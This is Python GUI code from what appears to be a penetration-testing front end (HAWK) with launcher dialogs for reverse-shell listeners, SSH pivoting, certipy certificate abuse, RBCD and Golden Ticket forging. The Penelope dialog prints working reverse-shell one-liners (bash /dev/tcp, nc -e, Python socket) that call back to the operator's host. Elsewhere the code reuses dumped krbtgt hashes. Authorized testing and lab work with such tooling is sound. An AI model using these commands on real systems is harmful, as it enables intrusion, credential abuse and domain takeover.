            u = user_var.get().strip()
            p = port_var.get().strip() or "1080"
            if not u:
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        "  [!] SSH user is empty — set it before "
                        "launching.", "warn")
                return
            if not p.isdigit() or not (1 <= int(p) <= 65535):
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        f"  [!] Invalid port '{p}' — 1..65535.",
                        "warn")
                return
            cmd = (f"ssh -D {p} -f -N {ssh_compat} "
                   f"{u}@{target}")
            script = (
                f"echo '═══  HAWK — SSH Dynamic (SOCKS5)  ═══'; "
                f"echo 'Opening SOCKS5 proxy on Kali 127.0.0.1:{p} "
                f"via {u}@{target}'; "
                f"echo 'After auth, ssh forks to background — this "
                f"xterm will exit.'; "
                f"echo 'Test with: curl --socks5 127.0.0.1:{p} "
                f"http://<internal_ip>'; "
                f"echo 'Kill later with: pkill -f \"ssh -D {p}\"'; "
                f"echo ''; "
                f"{cmd}; "
                f"echo ''; "
                f"read -p 'Press ENTER to close (SOCKS still up in "
                f"background)...'")
            ok = _open_terminal(
                f"HAWK — SSH Dynamic :{p}", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] SSH Dynamic SOCKS5 :{p} launched "
                    f"({u}@{target})"
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row = _btn_row(win)
        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_penelope(self, tool):
        """Penelope launcher — port field + xterm launch.

        Penelope is a REVERSE-shell handler: it opens a listener and,
        when the target's shell connects back, gives the operator an
        interactive PTY-upgraded session with upload/download commands.
        The interactive part means it MUST run in a real terminal —
        HAWK's own subprocess pipe would show the "listening on 4444"
        banner and freeze the moment a shell tried to interact.
        Dedicated mini dialog: pick a port, launch in an xterm.

        Availability check UP FRONT — the custom intercept in _on_click
        bypasses the normal binary precheck, so an uninstalled penelope
        would silently fail with "command not found" at launch.
        """
        if not tool.is_available():
            self._show_install_dialog(tool)
            return

        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.runner import _open_terminal, lhost_detect

        kali_ip = lhost_detect() or "<KALI_IP>"

        win = _make_win(self, "PENELOPE — Reverse-shell handler",
                        720, 520)
        _title(win, "🎯  PENELOPE — Reverse-shell handler")
        _sub(win,
             "Modern replacement for pwncat-cs — Python 3.12/3.13 "
             "compatible, actively maintained.",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "Penelope opens a listener on the chosen port.  When the "
            "target's reverse shell connects back, penelope auto-"
            "upgrades the shell to a full PTY (stty raw + terminfo), "
            "logs every keystroke, and exposes upload/download plus "
            "script auto-execution.\n\n"
            "You still need to trigger the reverse shell FROM the "
            "target — penelope only handles the receiving side.  "
            "Common triggers (paste in the target shell, replace "
            "<PORT> with the number below):\n\n"
            f"   # bash /dev/tcp — modern Linux (bash built with "
            f"--enable-net-redirections):\n"
            f"   bash -i >& /dev/tcp/{kali_ip}/<PORT> 0>&1\n\n"
            f"   # netcat with -e — universal fallback, works on "
            f"legacy targets (MS2 etc.):\n"
            f"   nc -e /bin/bash {kali_ip} <PORT>\n"
            f"   nc -e /bin/sh   {kali_ip} <PORT>   # if bash absent\n\n"
            f"   # Python 3 — modern Linux:\n"
            f"   python3 -c 'import socket,os,pty;s=socket.socket();"
            f"s.connect((\"{kali_ip}\",<PORT>));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'\n\n"
            f"   # Python 2 — legacy targets with only python 2.x:\n"
            f"   python -c 'import socket,subprocess,os;s=socket.socket();"
            f"s.connect((\"{kali_ip}\",<PORT>));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  INTERACTIVE — the listener runs in an xterm so the "
            "PTY-upgraded shell is fully usable (arrow keys, Ctrl+C, "
            "vim, tab completion).  Close the xterm or press exit "
            "inside penelope to stop.",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # ── Port field ─────────────────────────────────────────────
        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
        param.pack(fill="x", padx=16, pady=(8, 4))
        ctk.CTkLabel(param, text="  Listen port on Kali:",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        port_prefill = (getattr(tool, "custom_args", "") or "").strip()
        port_var = ctk.StringVar(value=port_prefill or "4444")
        entry = ctk.CTkEntry(param, textvariable=port_var, width=140,
            height=28, font=_f("sm"),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1,
            corner_radius=3)
        entry.pack(anchor="w", padx=10, pady=(0, 4))
        ctk.CTkLabel(param,
            text="  Any free TCP port on Kali — 4444 is the common "
                 "default; pick something else if 4444 is busy.",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(fill="x", padx=10, pady=(0, 8))

        # ── Preview ────────────────────────────────────────────────
        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=4)
        prev.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(prev, text="  Generated command:",
                     font=_f("sm", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        preview_box = ctk.CTkTextbox(prev, height=36,
            font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="disabled", wrap="word")
        preview_box.pack(fill="x", padx=10, pady=(0, 8))

        def _refresh(*_):
            p = port_var.get().strip() or "4444"
            preview_box.configure(state="normal")
            preview_box.delete("1.0", "end")
            preview_box.insert("1.0", f"penelope {p}")
            preview_box.configure(state="disabled")

        port_var.trace_add("write", _refresh)
        _refresh()

        # ── Launch ─────────────────────────────────────────────────
        def _launch():
            p = port_var.get().strip() or "4444"
            if not p.isdigit() or not (1 <= int(p) <= 65535):
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        f"  [!] Invalid port '{p}' — must be 1..65535.",
                        "warn")
                return
            script = (
                f"echo '═══  HAWK — PENELOPE listener on :{p}  ═══'; "
                f"echo 'Waiting for a reverse shell.  Trigger on the "
                f"target with e.g.:'; "
                f"echo '  bash -i >& /dev/tcp/{kali_ip}/{p} 0>&1'; "
                f"echo ''; "
                f"penelope {p}; "
                f"echo ''; "
                f"read -p 'Penelope closed. Press ENTER to close...'")
            ok = _open_terminal(f"HAWK — PENELOPE :{p}", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] PENELOPE listening on :{p} in xterm."
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row = _btn_row(win)
        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_sshuttle(self, tool):
        """SSHUTTLE launcher — SSH-user field + xterm launch.

        The bare RUN path fails on two counts: the tool template has an
        empty {extra} until the operator sets custom_args (silently
        producing `-r @<target>`, which sshuttle rejects); and sudo
        can't prompt inside HAWK's subprocess (needs a real TTY).  This
        dialog collects the SSH user, previews the resolved command,
        and launches sshuttle in an xterm so the sudo and SSH password
        prompts are both visible and interactive.

        Availability check UP FRONT — the custom intercept in _on_click
        bypasses the normal binary precheck, so an uninstalled sshuttle
        would silently fail with "command not found" at launch.
        """
        if not tool.is_available():
            self._show_install_dialog(tool)
            return

        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.runner import _open_terminal

        target = ""
        try:
            sess = self.app.session_manager.current
            target = sess.target_ip if sess else ""
        except Exception:
            pass
        target = target or "<TARGET_IP>"

        win = _make_win(self, "SSHUTTLE — Transparent SSH tunnel",
                        720, 560)
        _title(win, "🔐  SSHUTTLE — Transparent SSH tunnel")
        _sub(win,
             "Route Kali's traffic through the pivot via SSH — no "
             "proxychains needed.",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "sshuttle SSHes into the pivot, spawns a tiny Python agent "
            "there, and transparently rewrites Kali's routing so tools "
            "reach the pivot's network unmodified.  0/0 tunnels ALL "
            "traffic; --dns tunnels DNS too.\n\n"
            "Preferred over chisel on very old kernels (< 2.6.27) "
            "where modern Go binaries crash on epoll_create1.",
            COLORS["text_cyan"])

        _note_box(win,
            "⚠  INTERACTIVE — needs the sudo password (Kali) and the "
            "SSH password OR key for the pivot.  Runs in an xterm so "
            "both prompts are visible.  CTRL+C in the xterm stops the "
            "tunnel and restores Kali's routing.\n\n"
            "PYTHON REQUIREMENT — sshuttle uploads a small agent to "
            "the pivot and executes it there; requires Python 2.6+ or "
            "Python 3 on the target.  Metasploitable 2 ships Python "
            "2.4/2.5 and will fail with a SyntaxError — use SSH "
            "Dynamic (SOCKS5) instead on that class of target.",
            COLORS["border_amber"], text_color=COLORS["text_yellow"])

        # ── SSH user field ─────────────────────────────────────────
        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
        param.pack(fill="x", padx=16, pady=(8, 4))
        ctk.CTkLabel(param, text="  SSH user on the pivot:",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        # Never pre-fill: the SSH username is a real credential and the
        # operator supplies it — no defaults, no auto-guessing from the
        # store.  Empty by default; the OPEN IN XTERM handler refuses
        # to launch until the operator types one.
        user_var = ctk.StringVar(value="")
        entry = ctk.CTkEntry(param, textvariable=user_var, width=220,
            height=28, font=_f("sm"),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1,
            corner_radius=3,
            placeholder_text="type the SSH username for the pivot")
        entry.pack(anchor="w", padx=10, pady=(0, 4))
        ctk.CTkLabel(param,
            text="  Type the SSH user that can log into the pivot "
                 "(then sshuttle will prompt for the SSH password in "
                 "the xterm).",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(fill="x", padx=10, pady=(0, 8))

        # ── Preview ────────────────────────────────────────────────
        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=4)
        prev.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(prev, text="  Generated command:",
                     font=_f("sm", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        preview_box = ctk.CTkTextbox(prev, height=90,
            font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="disabled", wrap="word")
        preview_box.pack(fill="x", padx=10, pady=(0, 8))

        # SSH compat flags for legacy targets (Metasploitable-era
        # OpenSSH 4.x offers only ssh-rsa/ssh-dss, which modern OpenSSH
        # 9.x rejects: "no matching host key type found").  Additive
        # `+algo` forms are safe on modern servers too, so we always
        # pass them and don't ask the operator.  Source of truth:
        # target_intel_widget._COMPAT_FLAGS["ssh"].
        ssh_compat = (
            "-oHostKeyAlgorithms=+ssh-rsa "
            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
            "diffie-hellman-group14-sha1 "
            "-oCiphers=+aes128-cbc,3des-cbc "
            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
            "-oMACs=+hmac-sha1,hmac-md5")

        def _refresh(*_):
            u = user_var.get().strip() or "<SSH_USER>"
            cmd = (f"sudo sshuttle -e \"ssh {ssh_compat}\" "
                   f"-r {u}@{target} 0/0 --dns")
            preview_box.configure(state="normal")
            preview_box.delete("1.0", "end")
            preview_box.insert("1.0", cmd)
            preview_box.configure(state="disabled")

        user_var.trace_add("write", _refresh)
        _refresh()

        # ── Launch ─────────────────────────────────────────────────
        def _launch():
            u = user_var.get().strip()
            if not u:
                if hasattr(self.app, "terminal"):
                    self.app.terminal.write(
                        "  [!] SSH user is empty — set it before "
                        "launching sshuttle.", "warn")
                return
            cmd = (f"sudo sshuttle -e \"ssh {ssh_compat}\" "
                   f"-r {u}@{target} 0/0 --dns")
            script = (
                f"echo '═══  HAWK — SSHUTTLE  ═══'; "
                f"echo 'Tunneling ALL Kali traffic through "
                f"{u}@{target}'; "
                f"echo 'Prompts: sudo password (Kali), then SSH "
                f"password for {u}@{target}'; "
                f"echo 'CTRL+C stops the tunnel and restores routing.'; "
                f"echo ''; "
                f"{cmd}; "
                f"echo ''; "
                f"read -p 'Tunnel closed. Press ENTER to close...'")
            ok = _open_terminal(f"HAWK — SSHUTTLE ({u}@{target})", script)
            if hasattr(self.app, "terminal"):
                self.app.terminal.write(
                    f"  [+] SSHUTTLE launched in xterm "
                    f"({u}@{target}, tunneling 0/0)"
                    if ok
                    else "  [!] Could not open terminal emulator.",
                    "success" if ok else "error")

        row = _btn_row(win)
        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _route_certipy_req(self, tool):
        """Certipy request-cert needs a CA name and a vulnerable
        template — both produced by CERTIPY FIND.  Instead of
        dropping the user into the generic auth dialog with two
        empty `<CA_NAME>` / `<TEMPLATE>` fields they can't guess,
        we:

          1. Scan Target Intel for a certipy_find finding containing
             those values.
          2. If found → auto-prefill the placeholders and open the
             normal auth dialog ready-to-fire.
          3. If missing → show a prerequisite dialog with a one-
             click "RUN CERTIPY FIND NOW" button, OR "PROCEED
             ANYWAY" if the user has the values from an external
             source.
        """
        ca_name, templates = self._extract_certipy_find_results()

        # Happy path: Target Intel has certipy_find output.
        if ca_name and templates:
            tmpl = templates[0]   # highest-severity/first ESC hit
            pf = {
                "_origin": "certipy_find (Target Intel)",
                "placeholders": {
                    "CA_NAME":  ca_name,
                    "TEMPLATE": tmpl,
                },
            }
            self.app.terminal.write(
                f"  [hawk] certipy_req: pre-filled CA='{ca_name}', "
                f"TEMPLATE='{tmpl}' from Target Intel.", "dim")
            self._route_ad_template(tool, prefill=pf)
            return

        # Missing prerequisites — show the guidance dialog.
        self._show_certipy_req_prerequisite_dialog(
            tool, ca_name, templates)

    def _extract_certipy_find_results(self) -> tuple:
        """Walk Target Intel findings looking for a certipy_find
        result.  Returns (ca_name, [templates]).  Either can be
        empty if nothing was found.

        Parses the description fields produced by
        _parse_certipy_find_to_intel:
            CA Name: <name>
            · ESC1  'Template Name'  note...
        """
        import re
        ca_name = ""
        templates: list = []

        intel = getattr(self.app, "target_intel", None)
        if intel is None:
            return ca_name, templates

        findings = []
        try:
            # target_intel keeps its list in `_auto_findings`.
            findings = getattr(intel, "_auto_findings", []) or []
        except Exception:
            findings = []

        for f in findings:
            src  = (f.get("source") or "").lower()
            desc = f.get("description") or ""
            if "certipy" not in src and "certipy" not in desc.lower():
                continue
            # CA Name line
            m = re.search(r"CA Name\s*:\s*(.+)", desc)
            if m and not ca_name:
                ca_name = m.group(1).strip().strip("'\"")
            # ESC list lines: "· ESCx  <subject>  <note>".  <subject> is a
            # template name (bare, or 'quoted' in older findings); CA-level
            # ESCs use "CA '<name>'" and are NOT request-able templates, so
            # skip them.  Anchor on the "·" bullet so prose like "no
            # exploitable ESC1-ESC11 misconfiguration" (from a no-vulns
            # finding) can't leak "misconfiguration" as a template.
            for tm in re.finditer(r"·\s*ESC\d+\s+(.+?)\s{2,}", desc):
                t = tm.group(1).strip().strip("'\"")
                if not t or t.startswith("CA "):
                    continue
                if t not in templates:
                    templates.append(t)
            # Fallback: "Template Name : <name>" from raw certipy
            # summary if the dialog was ever pasted verbatim.
            for tm in re.finditer(
                    r"Template Name\s*:\s*(.+)", desc):
                t = tm.group(1).strip().strip("'\"")
                if t and t not in templates:
                    templates.append(t)

        return ca_name, templates

    def _show_certipy_req_prerequisite_dialog(self, tool, ca_name,
                                               templates):
        """Lightweight blocking dialog explaining that certipy_req
        needs values produced by certipy_find.  Gives the user three
        options:
          · RUN CERTIPY FIND NOW — opens that tool's dialog
          · PROCEED ANYWAY — opens the standard auth dialog with
            empty <CA_NAME>/<TEMPLATE> fields (they must fill both)
          · CANCEL
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        win = _make_win(self, "Certipy Request — prerequisite check",
                        680, 520)
        _title(win, "⚠  Certipy REQ needs two values from FIND")
        _sub(win,
             "certipy req -ca <NAME> -template <NAME>",
             COLORS["text_dim"])

        _note_box(
            win,
            "This tool forges a certificate for an impersonated "
            "user by abusing a vulnerable template.  It needs:\n\n"
            "  · CA_NAME  — the Enterprise CA's canonical name\n"
            "  · TEMPLATE — the name of a vulnerable template "
            "(ESC1-11)\n\n"
            "Both values are produced by CERTIPY FIND.  HAWK "
            "couldn't locate a certipy-find result in Target Intel "
            "for this session, so we can't pre-fill them.",
            COLORS["border_amber"])

        if ca_name or templates:
            ctk.CTkLabel(
                win,
                text=(f"  partial values found — CA='{ca_name or '—'}', "
                      f"templates={len(templates)}"),
                font=_f("sm"), text_color=COLORS["text_dim"],
                anchor="w",
            ).pack(fill="x", padx=24, pady=(0, 6))

        _note_box(
            win,
            "Recommended path:\n"
            "  1. Click 'RUN CERTIPY FIND NOW' below\n"
            "  2. Fill the auth dialog (same creds you'd use for req)\n"
            "  3. When find completes → re-open CERTIPY REQ, the "
            "placeholders will be pre-filled from the find output.",
            COLORS["border_dim"])

        def _run_find_now():
            _safe_destroy(win)
            # Find the certipy_find tool across cards and launch it
            # via the regular routing.  Same pattern as
            # launch_tool_prefilled's lookup loop.
            find_tool = None
            try:
                for card in self.app.kill_chain_panel.cards.values():
                    for t in card.module.get_tools() or []:
                        if t.id == "certipy_find":
                            find_tool = t
                            break
                    if find_tool:
                        break
            except Exception:
                pass
            if find_tool is None:
                self.app.terminal.write(
                    "  [!] certipy_find tool not found in the "
                    "kill chain — install it or run it manually.",
                    "error")
                return
            # Dispatch through the normal routing (goes through
            # _route_ad_template for the auth dialog).
            self._route_ad_template(find_tool)

        def _proceed_anyway():
            _safe_destroy(win)
            # Open the normal auth dialog with a banner note so the
            # user remembers they owe us CA_NAME / TEMPLATE manually.
            pf = {
                "_origin": "manual entry (no certipy_find result)",
                "placeholders": {
                    "CA_NAME":  ca_name or "",
                    "TEMPLATE": (templates[0] if templates else ""),
                },
            }
            self._route_ad_template(tool, prefill=pf)

        row = _btn_row(win)
        _btn(row, "RUN CERTIPY FIND NOW", _run_find_now,
             primary=True, w=220)
        _btn(row, "PROCEED ANYWAY", _proceed_anyway, w=170)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=100)

    def _route_rbcd_attack(self, tool):
        """RBCD needs two computer names:
          · <ATTACKER_COMPUTER>  — a machine account we control
          · <TARGET_COMPUTER>    — the box whose RBCD attr we write

        The attacker computer is almost always created via HAWK's
        ADDCOMPUTER tool (any domain user can make up to 10 via the
        default msDS-MachineAccountQuota=10).  We scan the Credential
        Store for machine accounts (username ending in `$`, category
        AD result) and pre-fill ATTACKER_COMPUTER with the most recent
        one so the user sees a ready-to-go command instead of a blank
        field they don't know how to fill.

        TARGET_COMPUTER has no reliable auto-source (bloodhound's
        computer list is structured data, not accessible here) —
        leave it blank so the placeholder dialog field surfaces with
        its help text.

        If NO machine account exists in the store we fall through
        with an empty prefill; the dialog still opens, but we emit
        a terminal hint suggesting ADDCOMPUTER first.
        """
        attacker = ""
        try:
            sess = self.app.session_manager.current
            if sess:
                fallback = ""
                for c in (sess.get_credentials() or []):
                    u = (c.username or "").strip()
                    if not (u.endswith("$") and len(u) > 1):
                        continue
                    svcs = getattr(c, "services", []) or []
                    if "Computer" in svcs:
                        attacker = u.rstrip("$")
                        break
                    if not fallback:
                        fallback = u.rstrip("$")
                if not attacker:
                    attacker = fallback
        except Exception:
            pass

        pf = {
            "_origin": ("addcomputer → Credential Store"
                        if attacker else "manual entry"),
            "placeholders": {
                "ATTACKER_COMPUTER": attacker,
                "TARGET_COMPUTER":   "",
            },
        }

        if not attacker:
            self.app.terminal.write(
                "  [hawk] rbcd_attack: no machine account found in "
                "the Credential Store.  Run ADDCOMPUTER first to "
                "create one (it needs msDS-MachineAccountQuota>0 "
                "on the domain) — then re-open this dialog and "
                "the attacker computer field will be pre-filled.",
                "info")
        else:
            self.app.terminal.write(
                f"  [hawk] rbcd_attack: pre-filled ATTACKER_COMPUTER="
                f"'{attacker}' from Credential Store.", "dim")

        self._route_ad_template(tool, prefill=pf)

    def _route_addcomputer(self, tool):
        """ADD COMPUTER — the standard AD auth dialog plus an OS-generation
        advisory telling the operator which -method is likely to work:
        SAMR (the impacket default) on legacy DCs, LDAPS on modern /
        hardened ones.

        The advisory is a HINT only — it never changes the command or
        pre-selects a flag.  SAMR stays the default and the operator is
        free to click -method SAMR / LDAPS / -k (or ignore the advisory
        entirely) via the chips.  Generation comes from the same
        classify_generation() the Connect terminal uses for compat flags,
        so the classification stays consistent across the app.
        """
        gen, osname = "unknown", ""
        try:
            fp = getattr(getattr(self.app, "target_intel", None),
                         "_fp", None)
            if fp is not None:
                gen = fp.classify_generation() or "unknown"
                if getattr(fp, "platform", "") == "windows":
                    osname = ("Windows " + (fp.version or "").strip()).strip()
        except Exception:
            gen, osname = "unknown", ""

        _os = f" ({osname})" if osname else ""
        if gen == "legacy":
            advisory = (f"  Method advisory: target looks LEGACY{_os} — "
                        f"SAMR (the default) is the right method here.  "
                        f"Don't switch to LDAPS: legacy DCs usually have no "
                        f"LDAPS/636 certificate.")
            color = COLORS["text_green"]
        elif gen == "modern":
            advisory = (f"  Method advisory: target looks MODERN{_os} — try "
                        f"SAMR (the default) first; if the DC rejects it, "
                        f"click -method LDAPS below.  Also expect MAQ may be "
                        f"0 on hardened DCs (creation blocked by design).")
            color = COLORS["text_yellow"]
        else:
            advisory = ("  Method advisory: OS not fingerprinted yet — run "
                        "enumeration (nmap -sV -sC / nxc smb) first for a "
                        "method recommendation.  SAMR (the default) works on "
                        "most DCs; LDAPS is the modern fallback.")
            color = COLORS["text_dim"]

        self._route_ad_template(
            tool, prefill={"advisory": advisory, "advisory_color": color})

    def _route_certipy_find(self, tool):
        """certipy find / quick — the standard AD auth dialog plus an
        OS-generation LDAP advisory.

        certipy v5 binds over LDAPS (636) by DEFAULT.  Legacy DCs (Server
        2008/2012, old TLS or no LDAPS cert) reset that handshake and the
        scan dies with 'socket ssl wrapping error' — which looks like "no
        AD CS" but usually isn't.  On a legacy target we advise adding the
        '-ldap-scheme ldap' chip (plain LDAP, 389).  HINT only: modern DCs
        often require LDAPS, so the operator stays free to keep it.
        """
        gen, osname = "unknown", ""
        try:
            fp = getattr(getattr(self.app, "target_intel", None),
                         "_fp", None)
            if fp is not None:
                gen = fp.classify_generation() or "unknown"
                if getattr(fp, "platform", "") == "windows":
                    osname = ("Windows " + (fp.version or "").strip()).strip()
        except Exception:
            gen, osname = "unknown", ""

        _os = f" ({osname})" if osname else ""
        if gen == "legacy":
            advisory = (f"  LDAP advisory: target looks LEGACY{_os} — "
                        f"certipy binds over LDAPS by default and legacy "
                        f"DCs usually reset the TLS handshake.  If it dies "
                        f"with an SSL error, add the '-ldap-scheme ldap' "
                        f"chip (plain LDAP, 389) and re-run.")
            color = COLORS["text_yellow"]
        elif gen == "modern":
            advisory = (f"  LDAP advisory: target looks MODERN{_os} — the "
                        f"default LDAPS should work (and may be required "
                        f"by signing/channel-binding).  Only fall back to "
                        f"'-ldap-scheme ldap' if LDAPS is filtered.")
            color = COLORS["text_dim"]
        else:
            advisory = ("  LDAP advisory: certipy uses LDAPS by default.  "
                        "If it fails with 'socket ssl wrapping error' "
                        "(common on legacy DCs), add the '-ldap-scheme "
                        "ldap' chip to force plain LDAP (389).")
            color = COLORS["text_dim"]

        self._route_ad_template(
            tool, prefill={"advisory": advisory, "advisory_color": color})

    def _route_ticketer_golden(self, tool):
        """Dedicated dialog for `impacket-ticketer`.

        Ticketer forges a Kerberos TGT (or TGS) offline from:
          · krbtgt's NTLM hash      (MANDATORY — 32 hex chars)
          · domain SID               (MANDATORY — S-1-5-21-x-y-z)
          · domain name              (the AD realm)
          · user to impersonate      (typically Administrator)

        None of these fit the `{user}:{password}@host` auth pattern
        the other AD tools share — the inputs are all derived from a
        PRIOR secretsdump DCSync run.  We open a focused dialog and
        auto-fill:
          · krbtgt hash      ← Credential Store entry where
                               username=='krbtgt' and hash_val set
          · domain SID       ← Target Intel finding from secretsdump
                               (first 'Domain SID: S-1-5-21-...' line)
          · domain name      ← session.target_domain
          · impersonate user ← 'Administrator' (default, editable)

        Input validation at RUN time:
          · NTLM hash must be exactly 32 hex chars (or LM:NT format)
          · Domain SID must match S-1-5-21-\\d+-\\d+-\\d+
          · All four fields required
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        import re

        target = self._get_target()
        if not target:
            return

        # ── Auto-fill from Credential Store + Target Intel ────────────
        krbtgt_hash = ""
        domain_sid = ""
        sid_source = ""
        default_domain = ""
        try:
            sess = self.app.session_manager.current
            if sess:
                default_domain = getattr(
                    sess, "target_domain", "") or ""
                # krbtgt hash from credential store
                for c in (sess.get_credentials() or []):
                    uname = (c.username or "").strip().lower()
                    if uname == "krbtgt":
                        h = (getattr(c, "hash_val", "") or "").strip()
                        if h:
                            # hash_val may be a full pwdump line
                            # (krbtgt:502:LM:NT:::), an LM:NT pair, or a
                            # bare NT.  impacket-ticketer -nthash wants
                            # the bare 32-hex NT, so pull it out of
                            # whichever shape (a naive split(':')[-1]
                            # grabbed the empty field after ':::').
                            m = re.match(
                                r"^[^:]+:\d+:[0-9a-fA-F]{32}:"
                                r"([0-9a-fA-F]{32}):", h)
                            if m:
                                h = m.group(1)
                            elif re.match(
                                    r"^[0-9a-fA-F]{32}:"
                                    r"[0-9a-fA-F]{32}$", h):
                                h = h.split(":")[1]
                            krbtgt_hash = h
                            break

                # Domain SID from Target Intel findings.  Prefer the
                # tools that genuinely READ the domain SID off the DC
                # (enum4linux / rpcclient lsaquery, lookupsid, netexec,
                # samrdump) over a blind "first S-1-5-21 anywhere", so
                # in a multi-target session we never pick up an
                # unrelated host's SID.  Only if none of those carried
                # one do we fall back to any finding.  We also record
                # WHERE it came from to show the operator (a golden
                # ticket signed with the wrong SID is silently useless).
                intel = getattr(self.app, "target_intel", None)
                findings = (getattr(intel, "_auto_findings", []) or []
                            if intel else [])
                _SID_RE = re.compile(r"S-1-5-21-\d+-\d+-\d+(?!\d)")
                _SID_AUTHORITATIVE = (
                    "enum4linux", "rpcclient", "lookupsid",
                    "netexec", "nxc", "samrdump")

                def _scan_sid(authoritative_only):
                    for f in findings:
                        src = (f.get("source", "") or "")
                        if authoritative_only and not any(
                                a in src.lower()
                                for a in _SID_AUTHORITATIVE):
                            continue
                        m = _SID_RE.search(
                            f.get("description", "") or "")
                        if m:
                            return m.group(0), (src or "?")
                    return "", ""

                domain_sid, sid_source = _scan_sid(True)
                if not domain_sid:
                    domain_sid, sid_source = _scan_sid(False)
        except Exception as e:
            print(f"[HAWK] ticketer auto-fill failed: {e}")

        # ── Dialog ────────────────────────────────────────────────────
        win = _make_win(self, "Ticketer — forge Golden Ticket",
                        720, 680)
        _title(win, "TICKETER — forge a Golden Ticket (offline)")
        _sub(win,
             "Needs krbtgt's NTLM hash + domain SID (from DCSync).",
             COLORS["text_dim"])

        _note_box(
            win,
            "Ticketer works ENTIRELY OFFLINE — no network round-trip. "
            "It crafts a Kerberos ticket locally using krbtgt's NTLM "
            "hash as the signing key.  The resulting .ccache grants "
            "domain-wide access until krbtgt is rotated TWICE "
            "(Microsoft's 'double tap' mitigation).",
            COLORS["border_dim"])

        if krbtgt_hash and domain_sid:
            _note_box(
                win,
                f"  Pre-filled from your session: krbtgt hash from the "
                f"Credential Store (secretsdump), domain SID from "
                f"{sid_source}.  Review and click RUN.",
                COLORS["border_green"])
        elif not krbtgt_hash and not domain_sid:
            _note_box(
                win,
                "  ⚠  No krbtgt hash in the Credential Store AND no "
                "domain SID in Target Intel.  Run SECRETSDUMP "
                "(DCSync) first — it produces both values and HAWK "
                "will pre-fill them here on the next open.",
                COLORS["border_amber"])
        elif not krbtgt_hash:
            _note_box(
                win,
                "  ⚠  Domain SID found, but no krbtgt hash in the "
                "Credential Store.  Run SECRETSDUMP (DCSync) to "
                "dump krbtgt, or paste the NT hash manually.",
                COLORS["border_amber"])
        else:
            _note_box(
                win,
                "  ⚠  krbtgt hash found, but no domain SID in "
                "Target Intel.  Get it via "
                "`impacket-lookupsid <u>:<p>@<dc>` or `whoami /user` "
                "on a joined host, then paste below.",
                COLORS["border_amber"])

        hash_var = ctk.StringVar(value=krbtgt_hash)
        sid_var  = ctk.StringVar(value=domain_sid)
        domain_var = ctk.StringVar(
            value=default_domain or "DOMAIN.LOCAL")
        impersonate_var = ctk.StringVar(value="Administrator")

        def _row(label, var, hint=""):
            fr = ctk.CTkFrame(win, fg_color="transparent")
            fr.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(
                fr, text=label, width=140, anchor="w",
                font=_f("sm", True),
                text_color=COLORS["text_bright"],
            ).pack(side="left")
            e = ctk.CTkEntry(
                fr, textvariable=var, font=_f("md"), height=30,
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_green"],
                border_width=1, corner_radius=3)
